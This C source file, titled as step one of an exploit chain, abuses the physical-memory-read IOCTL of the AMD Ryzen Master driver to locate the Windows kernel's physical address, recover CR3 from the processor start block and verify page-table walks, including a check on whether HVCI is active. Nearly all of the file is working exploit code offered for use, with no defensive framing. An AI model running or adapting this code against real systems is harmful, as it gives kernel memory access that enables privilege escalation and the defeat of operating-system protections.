/*
 * step1_kernel_cr3.c — Step 1: leak ntoskrnl PA + CR3
 *
 * Step 1a: ntoskrnl VA  — NtQuerySystemInformation (no driver)
 * Step 1b: ntoskrnl PA  — 2MB physical scan (NtBuildNumber 0xF000xxxx)
 * Step 1c: CR3          — PROCESSOR_START_BLOCK @ PA 0x1000, offset +0x30
 *                         (AMD driver có thể đọc PA 0x1000 — cpuz161 không đọc được)
 * Step 1d: Page walk    — VA→PA để verify CR3 có dùng được không
 *
 * Build:
 *   cl /nologo /W3 /O2 step1_kernel_cr3.c /link kernel32.lib advapi32.lib ntdll.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEVICE_NAME     L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u

/* ── Physical ranges ─────────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;
static HANDLE    g_dev = INVALID_HANDLE_VALUE;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vname_sz, vdata_sz, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD idx=0;;idx++) {
        vname_sz=sizeof vname; vdata_sz=0;
        LONG r=RegEnumValueA(hKey,idx,vname,&vname_sz,NULL,&type,NULL,&vdata_sz);
        if(r==ERROR_NO_MORE_ITEMS) break;
        if((type!=3&&type!=8)||vdata_sz<20) continue;
        buf=(uint8_t*)malloc(vdata_sz);
        if(!buf) continue;
        if(RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vdata_sz)==ERROR_SUCCESS)
            {sz=vdata_sz;break;}
        free(buf);buf=NULL;
    }
    RegCloseKey(hKey);
    if(!buf||sz<20){free(buf);return;}
    DWORD count=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for(DWORD i=0;i<count&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        printf("  [range %d] PA 0x%012llX  +%llu MB\n",g_nranges,
               (unsigned long long)g_ranges[g_nranges].base,
               (unsigned long long)(g_ranges[g_nranges].size>>20));
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

/* ── Phys READ ───────────────────────────────────────────────────────────── */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12 + sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz);
    if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                            &in, sizeof(in), out, out_sz, &got, NULL);
    if(ok && got>=12) memcpy(buf, out+12, sz);
    free(out);
    return ok && got>=12;
}

/* ── Hex dump ────────────────────────────────────────────────────────────── */
static void hexdump(const uint8_t *p, size_t n, uint64_t base)
{
    for(size_t i=0;i<n;i+=16){
        printf("  %012llX  ",(unsigned long long)(base+i));
        for(size_t j=0;j<16;j++){
            if(i+j<n) printf("%02x ",p[i+j]); else printf("   ");
            if(j==7) printf(" ");
        }
        printf("\n");
    }
}

/* ── ntoskrnl VA ─────────────────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct{HANDLE S;PVOID MB;PVOID IB;ULONG IS;ULONG F;USHORT L,I,Lc,O;CHAR P[256];}MOD;
typedef struct{ULONG C;MOD M[1];}MODLIST;

static uint64_t get_ntoskrnl_va(char *path_out)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                            "NtQuerySystemInformation");
    if(!fn) return 0;
    ULONG sz=0; fn(11,NULL,0,&sz); sz+=4096;
    MODLIST *ml=(MODLIST*)malloc(sz);
    fn(11,ml,sz,NULL);
    uint64_t va=(uint64_t)ml->M[0].IB;
    if(path_out){
        GetWindowsDirectoryA(path_out,MAX_PATH);
        strcat_s(path_out,MAX_PATH,"\\system32\\ntoskrnl.exe");
    }
    free(ml);
    return va;
}

/* ── ntoskrnl PA — 2MB scan ──────────────────────────────────────────────── */
static uint64_t find_ntoskrnl_pa(const char *nt_path)
{
    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,
                          NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz);
    DWORD rd=0; ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);

    /* find NtBuildNumber RVA */
    int32_t elf=*(int32_t*)(pe+0x3C);
    uint16_t ns=*(uint16_t*)(pe+elf+6), osz=*(uint16_t*)(pe+elf+20);
    uint32_t sbase=(uint32_t)elf+24+osz;
    uint32_t exp_rva=*(uint32_t*)(pe+elf+0x88), exp_fo=0;
    for(uint16_t i=0;i<ns;i++){
        uint32_t s=sbase+i*40,va=*(uint32_t*)(pe+s+12),vsz=*(uint32_t*)(pe+s+16);
        if(!vsz) vsz=*(uint32_t*)(pe+s+24);
        uint32_t fo=*(uint32_t*)(pe+s+20);
        if(exp_rva>=va&&exp_rva<va+vsz){exp_fo=fo+(exp_rva-va);break;}
    }
    uint32_t rva_build=0;
    if(exp_fo){
        const uint8_t *exp=pe+exp_fo;
        uint32_t nnames=*(uint32_t*)(exp+0x18);
        uint32_t rva_fns=*(uint32_t*)(exp+0x1C),rva_nms=*(uint32_t*)(exp+0x20),rva_ord=*(uint32_t*)(exp+0x24);
        uint32_t fo_fns=0,fo_nms=0,fo_ord=0;
        for(uint16_t i=0;i<ns;i++){
            uint32_t s=sbase+i*40,va=*(uint32_t*)(pe+s+12),vsz=*(uint32_t*)(pe+s+16);
            if(!vsz) vsz=*(uint32_t*)(pe+s+24); uint32_t fo=*(uint32_t*)(pe+s+20);
            if(!fo_fns&&rva_fns>=va&&rva_fns<va+vsz) fo_fns=fo+(rva_fns-va);
            if(!fo_nms&&rva_nms>=va&&rva_nms<va+vsz) fo_nms=fo+(rva_nms-va);
            if(!fo_ord&&rva_ord>=va&&rva_ord<va+vsz) fo_ord=fo+(rva_ord-va);
        }
        for(uint32_t i=0;i<nnames&&fo_fns&&fo_nms&&fo_ord;i++){
            uint32_t nm_rva=*(uint32_t*)(pe+fo_nms+i*4),nm_fo=0;
            for(uint16_t j=0;j<ns;j++){
                uint32_t s=sbase+j*40,va=*(uint32_t*)(pe+s+12),vsz=*(uint32_t*)(pe+s+16);
                if(!vsz) vsz=*(uint32_t*)(pe+s+24); uint32_t fo=*(uint32_t*)(pe+s+20);
                if(nm_rva>=va&&nm_rva<va+vsz){nm_fo=fo+(nm_rva-va);break;}
            }
            if(!nm_fo||nm_fo>=fsz) continue;
            if(strcmp((char*)(pe+nm_fo),"NtBuildNumber")==0){
                uint16_t ord=*(uint16_t*)(pe+fo_ord+i*2);
                rva_build=*(uint32_t*)(pe+fo_fns+ord*4);
                break;
            }
        }
    }
    free(pe);
    if(!rva_build){printf("  [-] NtBuildNumber RVA not found\n");return 0;}
    printf("  NtBuildNumber RVA = 0x%08X\n",rva_build);

    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t cf=ssd|0xF0000000, cc=ssd|0xC0000000;
    printf("  Candidates: 0x%X / 0x%X / 0x%X\n",ssd,cf,cc);

    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva_build,4)) continue;
            uint32_t val=0;
            if(!phys_read(pa+rva_build,&val,4)) continue;
            if(val!=ssd&&val!=cf&&val!=cc) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            printf("  [HIT] PA=0x%012llX  val=0x%08X%s\n",
                   (unsigned long long)pa,val,(mz==0x5A4D)?" [MZ]":"");
            return pa;
        }
    }
    return 0;
}

/* ── CR3 from PROCESSOR_START_BLOCK @ PA 0x1000 ─────────────────────────── */
static uint64_t find_cr3_lowstub(void)
{
    /* AMD Ryzen Master can read PA 0x1000 (range 0 starts there).
     * PROCESSOR_START_BLOCK layout (x64 Windows):
     *   +0x000  Jmp[4]           — 0xE9 near jump (AP startup)
     *   +0x004  CompletionFlag   — ULONG
     *   +0x018  LmTarget         — UINT64 VA (HalpLMStub, kernel VA range)
     *   +0x030  PageDirectoryBase— UINT64 (CR3!)
     */
    printf("  Reading PROCESSOR_START_BLOCK @ PA 0x1000...\n");
    uint8_t block[0x100]={0};
    if(!phys_read(0x1000, block, sizeof block)){
        printf("  [-] phys_read(0x1000) failed\n");
        return 0;
    }

    printf("  Raw (first 0x60 bytes):\n");
    hexdump(block, 0x60, 0x1000);
    printf("\n");

    uint64_t lm_target = *(uint64_t*)(block+0x18);
    uint64_t cr3_at30  = *(uint64_t*)(block+0x30);

    printf("  +0x018 LmTarget          = 0x%016llX %s\n",
           (unsigned long long)lm_target,
           (lm_target >= 0xFFFF800000000000ULL) ? "(kernel VA)" : "(zero/invalid)");
    printf("  +0x030 PageDirectoryBase = 0x%016llX %s\n",
           (unsigned long long)cr3_at30,
           (cr3_at30 && !(cr3_at30&0xFFF)) ? "(page-aligned)" : "(zero/bad)");

    /* Validate CR3 at +0x30 */
    if(cr3_at30 && !(cr3_at30&0xFFF) && cr3_at30 < 0x10000000000ULL)
        return cr3_at30;

    /* Fallback: scan block for CR3 candidate */
    printf("\n  +0x030 not valid — scanning block for CR3 candidates...\n");
    for(int off=0;off+8<=0x100;off+=8){
        uint64_t v=*(uint64_t*)(block+off);
        if(v && !(v&0xFFF) && v<0x10000000000ULL)
            printf("  [?] offset +0x%03X: 0x%016llX  ← CR3 candidate\n",
                   off,(unsigned long long)v);
    }
    return 0;
}

/* ── 4-level page walk ───────────────────────────────────────────────────── */
static uint64_t va_to_pa(uint64_t cr3, uint64_t va)
{
    uint64_t idx[4]={(va>>39)&0x1FF,(va>>30)&0x1FF,(va>>21)&0x1FF,(va>>12)&0x1FF};
    uint64_t table=cr3&~0xFFFULL;
    for(int lvl=0;lvl<4;lvl++){
        uint64_t entry=0;
        if(!phys_read(table+idx[lvl]*8,&entry,8)) return 0;
        if(!(entry&1)) return 0;
        if(lvl==1&&(entry&(1ULL<<7))) return (entry&~0x3FFFFFFFULL)|(va&0x3FFFFFFF);
        if(lvl==2&&(entry&(1ULL<<7))) return (entry&~0x1FFFFFULL)|(va&0x1FFFFF);
        table=entry&~0xFFFULL;
    }
    return table|(va&0xFFF);
}

/* ═══════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    printf("=== Step 1: Kernel Leak + CR3 via AMD Ryzen Master ===\n\n");

    /* Open device */
    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                      0,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open device (err=%lu)\n",GetLastError());
        printf("    Run as Admin? AMD CPU? Driver running?\n");
        return 1;
    }
    printf("[+] Device opened\n\n");

    /* Load ranges */
    printf("[1] Physical memory ranges:\n");
    load_ranges();
    if(!g_nranges){printf("  [-] No ranges\n");return 1;}
    printf("  [+] %d ranges\n\n",g_nranges);

    /* Step 1a: ntoskrnl VA */
    printf("[2] ntoskrnl VA (NtQuerySI — no driver needed):\n");
    char nt_path[MAX_PATH]={0};
    uint64_t nt_va=get_ntoskrnl_va(nt_path);
    printf("  [+] ntoskrnl VA = 0x%016llX\n",(unsigned long long)nt_va);
    printf("  [+] Path        = %s\n\n",nt_path);

    /* Step 1b: ntoskrnl PA */
    printf("[3] ntoskrnl PA (2MB physical scan):\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("  [-] Not found\n");CloseHandle(g_dev);return 1;}
    printf("  [+] ntoskrnl PA = 0x%016llX\n\n",(unsigned long long)nt_pa);
    printf("  PA formula: PA = 0x%llX + (VA - 0x%llX)\n\n",
           (unsigned long long)nt_pa,(unsigned long long)nt_va);

    /* Step 1c: CR3 from Low Stub */
    printf("[4] CR3 from PROCESSOR_START_BLOCK (PA 0x1000):\n");
    uint64_t cr3=find_cr3_lowstub();
    if(!cr3){
        printf("  [-] CR3 not found at +0x030\n");
        printf("  [*] AMD driver đọc được PA 0x1000 nhưng CR3 field = 0\n");
        printf("  [*] UEFI cleared after AP startup — check scan output above\n\n");
    } else {
        printf("  [+] CR3 = 0x%016llX\n\n",(unsigned long long)cr3);

        /* Step 1d: verify page walk */
        printf("[5] Page walk verification (CR3 → ntoskrnl VA → PA):\n");
        uint64_t walked_pa=va_to_pa(cr3,nt_va);
        printf("  ntoskrnl VA 0x%016llX → PA 0x%016llX\n",
               (unsigned long long)nt_va,(unsigned long long)walked_pa);
        if(walked_pa){
            uint8_t probe[8]={0};
            phys_read(walked_pa,probe,8);
            printf("  PA probe: %02X %02X %02X %02X %02X %02X %02X %02X\n",
                   probe[0],probe[1],probe[2],probe[3],
                   probe[4],probe[5],probe[6],probe[7]);
            if(probe[0]=='M'&&probe[1]=='Z')
                printf("  [+] MZ header found — WALK WORKS! HVCI off\n");
            else if(walked_pa==nt_pa)
                printf("  [+] PA matches ntoskrnl PA from scan — WALK CORRECT!\n");
            else if(probe[0]==0&&probe[1]==0)
                printf("  [?] Zeros — HVCI on (code protected) or wrong PA\n");
            else
                printf("  [?] Unexpected data\n");
        } else {
            printf("  [-] Walk failed — MmMapIoSpace blocked paging pages (Win10 1803+)\n");
            printf("  [*] CR3 là valid nhưng không walk được với driver này\n");
        }

        /* Also walk SharedUserData (fixed VA, good test) */
        printf("\n  SharedUserData VA 0xFFFFF78000000000 → PA: ");
        uint64_t ssd_pa=va_to_pa(cr3,0xFFFFF78000000000ULL);
        if(ssd_pa){
            printf("0x%016llX\n",(unsigned long long)ssd_pa);
            uint32_t build=0;
            phys_read(ssd_pa+0x260,&build,4);
            printf("  NtBuildNumber at PA+0x260 = 0x%X (%u) %s\n",
                   build,build&0xFFFF,
                   (build&0xFFFF)==(*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF)
                   ? "[MATCH — WALK CONFIRMED!]" : "[mismatch]");
        } else {
            printf("FAILED (paging blocked)\n");
        }
    }

    /* Summary */
    printf("\n=== RESULT ===\n");
    printf("ntoskrnl VA  = 0x%016llX\n",(unsigned long long)nt_va);
    printf("ntoskrnl PA  = 0x%016llX\n",(unsigned long long)nt_pa);
    printf("CR3          = 0x%016llX\n",(unsigned long long)cr3);
    printf("PA formula   = 0x%llX + (VA - 0x%llX)\n",
           (unsigned long long)nt_pa,(unsigned long long)nt_va);

    CloseHandle(g_dev);
    return 0;
}
